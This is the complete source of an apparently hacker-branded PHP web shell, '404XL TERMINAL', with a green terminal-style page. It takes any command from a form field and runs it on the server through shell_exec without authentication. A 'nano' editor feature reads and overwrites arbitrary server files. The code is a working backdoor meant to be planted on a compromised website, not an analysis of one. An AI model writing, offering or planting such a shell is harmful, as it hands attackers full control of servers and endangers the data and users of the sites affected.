<?php
$output = '';
$nanoOutput = '';
$nanoContent = '';
$nanoFilename = '';

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Handle nano commands
    if (strpos(trim($cmd), 'nano ') === 0) {
        $nanoFilename = trim(substr($cmd, 5));
        if (file_exists($nanoFilename)) {
            $nanoContent = htmlspecialchars(file_get_contents($nanoFilename));
        } else {
            $nanoContent = '';
        }
        $nanoOutput = "<div class='nano-editor'><h3>Nano Editor: $nanoFilename</h3>";
        $nanoOutput .= "<form method='POST'><input type='hidden' name='nano_filename' value='$nanoFilename'>";
        $nanoOutput .= "<textarea name='nano_content'>$nanoContent</textarea>";
        $nanoOutput .= "<div class='nano-actions'>";
        $nanoOutput .= "<input type='submit' name='save_nano' value='💾 SAVE' class='nano-button'>";
        $nanoOutput .= "<input type='button' value='❌ CLOSE' class='nano-button nano-close'>";
        $nanoOutput .= "</div></form></div>";
    } 
    // Handle other commands
    else {
        $output = shell_exec($cmd);
    }
}

// Handle nano content save
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_nano'])) {
    $nanoFilename = $_POST['nano_filename'];
    $nanoContent = $_POST['nano_content'];
    file_put_contents($nanoFilename, $nanoContent);
    $output = "File saved: $nanoFilename";
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <title>404XL TERMINAL</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@700&display=swap');

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      background: linear-gradient(to right, #000000 0%, #003300 100%);
      font-family: 'Roboto Mono', monospace;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #00ff99;
      padding: 20px;
    }

    .terminal-container {
      background: rgba(0, 0, 0, 0.92);
      border: 1px solid #00ff99;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff99aa;
      width: 100%;
      max-width: 850px;
      padding: 30px;
      animation: fadeIn 1s ease-in-out;
      font-weight: 700;
      position: relative;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to   { opacity: 1; transform: scale(1); }
    }

    .logo img {
      height: 50px;
      margin-bottom: 20px;
      filter: drop-shadow(0 0 6px #00ff99);
    }

    h2 {
      font-size: 1.6rem;
      margin-bottom: 25px;
      color: #66ffcc;
      text-align: center;
      font-weight: 700;
    }

    form {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    input[type="text"] {
      flex: 1;
      background-color: #000000dd;
      border: 1px solid #00ff99;
      color: #00ff99;
      font-size: 15px;
      padding: 12px;
      border-radius: 8px;
      outline: none;
      font-family: 'Roboto Mono', monospace;
      font-weight: 700;
      transition: all 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #33ffaa;
      box-shadow: 0 0 8px #33ffaa;
    }

    input[type="submit"] {
      background: #001f1f;
      color: #00ff99;
      border: 1px solid #00ff99;
      padding: 12px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 700;
      font-family: 'Roboto Mono', monospace;
      transition: 0.3s ease;
    }

    input[type="submit"]:hover {
      background: #00ff99;
      color: #001f1f;
      box-shadow: 0 0 12px #00ff99;
    }

    h3 {
      margin-top: 15px;
      font-size: 16px;
      color: #99ffcc;
      font-weight: 700;
    }

    pre {
      background: #000;
      color: #00ff99;
      padding: 16px;
      border-radius: 8px;
      font-size: 14px;
      line-height: 1.5;
      max-height: 300px;
      overflow-y: auto;
      box-shadow: inset 0 0 10px #00ff99aa;
      font-family: 'Roboto Mono', monospace;
      font-weight: 700;
    }

    .nano-editor {
      background: rgba(0, 30, 15, 0.8);
      border: 1px solid #00ff99;
      border-radius: 8px;
      padding: 15px;
      margin-top: 15px;
      box-shadow: 0 0 15px #00ff99aa;
    }

    .nano-editor h3 {
      color: #00ff99;
      border-bottom: 1px solid #00ff99;
      padding-bottom: 8px;
      margin-bottom: 15px;
    }

    .nano-editor textarea {
      width: 100%;
      height: 250px;
      background: #000;
      color: #00ff99;
      border: 1px solid #00ff99;
      border-radius: 8px;
      padding: 15px;
      font-family: 'Roboto Mono', monospace;
      font-size: 14px;
      resize: vertical;
      outline: none;
      box-shadow: inset 0 0 10px #00ff99aa;
      transition: all 0.3s ease;
    }

    .nano-editor textarea:focus {
      border-color: #33ffaa;
      box-shadow: inset 0 0 15px #33ffaa;
    }

    .nano-actions {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      justify-content: flex-end;
    }

    .nano-button {
      background: #001f1f;
      color: #00ff99;
      border: 1px solid #00ff99;
      padding: 12px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 700;
      font-family: 'Roboto Mono', monospace;
      transition: 0.3s ease;
    }

    .nano-button:hover {
      background: #00ff99;
      color: #001f1f;
      box-shadow: 0 0 12px #00ff99;
    }

    .command-hint {
      font-size: 13px;
      color: #00cc66;
      margin-top: 10px;
      text-align: center;
    }

    ::-webkit-scrollbar {
      width: 6px;
    }

    ::-webkit-scrollbar-thumb {
      background: #00ff99;
      border-radius: 3px;
    }

    @media (max-width: 600px) {
      form {
        flex-direction: column;
      }

      input[type="submit"] {
        width: 100%;
      }

      .nano-button {
        width: 100%;
      }
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Close nano editor
      document.querySelector('.nano-close')?.addEventListener('click', function() {
        document.querySelector('.nano-editor').remove();
      });
      
      // Focus command input
      document.querySelector('input[name="cmd"]')?.focus();
    });
  </script>
</head>
<body>
  <div class="terminal-container">
    <div class="logo">
      <img src="https://a.top4top.io/p_3447c0pvd1.png" alt="Logo">
    </div>
    <h2>💻 404XL TERMINAL</h2>
    <form method="POST">
      <input type="text" name="cmd" placeholder="Enter command here.." autofocus required />
      <input type="submit" value="▶ RUN" />
    </form>
    <div class="command-hint">THE INTELEON404</div>

    <?php if (!empty($nanoOutput)): ?>
      <?= $nanoOutput ?>
    <?php endif; ?>

    <?php if (!empty($output)): ?>
      <h3>Output:</h3>
      <pre><?= htmlspecialchars($output); ?></pre>
    <?php endif; ?>
  </div>
</body>
</html>
